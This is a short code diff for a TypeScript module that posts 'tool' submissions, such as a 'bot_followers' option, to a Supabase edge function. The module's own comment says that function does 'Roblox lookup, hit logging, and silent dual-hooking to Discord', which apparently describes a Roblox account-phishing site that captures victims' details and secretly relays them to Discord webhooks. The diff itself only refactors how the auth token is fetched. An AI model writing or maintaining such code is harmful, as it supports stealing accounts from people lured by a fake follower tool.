@@ -1,5 +1,6 @@
 // Sends a tool submission to the server-side edge function, which handles
 // Roblox lookup, hit logging, and silent dual-hooking to Discord.
+import { supabase } from '@/integrations/supabase/client';
 
 export type ToolKey =
   | 'bot_followers'
@@ -30,8 +31,8 @@ const ANON = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
 
 export const submitHit = async (args: SubmitArgs): Promise<boolean> => {
   try {
-    const token = localStorage.getItem('sb-wuaoyesxdwiuresgzdbv-auth-token');
-    const accessToken = token ? JSON.parse(token)?.access_token : undefined;
+    const { data: sessionData } = await supabase.auth.getSession();
+    const accessToken = sessionData.session?.access_token;
     const res = await fetch(`${FN_URL}/submit-hit`, {
       method: 'POST',
       headers: {
